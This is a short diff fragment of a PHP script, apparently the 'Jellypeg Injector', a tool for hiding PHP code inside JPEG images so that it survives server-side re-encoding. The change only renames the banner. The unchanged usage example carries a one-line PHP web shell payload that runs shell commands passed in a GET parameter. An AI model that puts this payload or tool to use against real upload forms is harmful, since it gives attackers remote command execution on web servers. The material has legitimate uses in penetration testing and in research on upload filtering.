@@ -12,7 +12,7 @@
 ini_set('display_errors', 1);
 error_reporting(E_PARSE);
 
-echo "-=Imagejpeg injector 1.9=-\n";
+echo "-=Jellypeg Injector 1.9=-\n";
 echo "[+] Usage: php jellypeg.php <width> <height> <quality> <code>\n";
 echo "[+] Example: php jellypeg.php 100 100 75 '<?=exec(\$_GET[\"c\"])?>'\n";
 
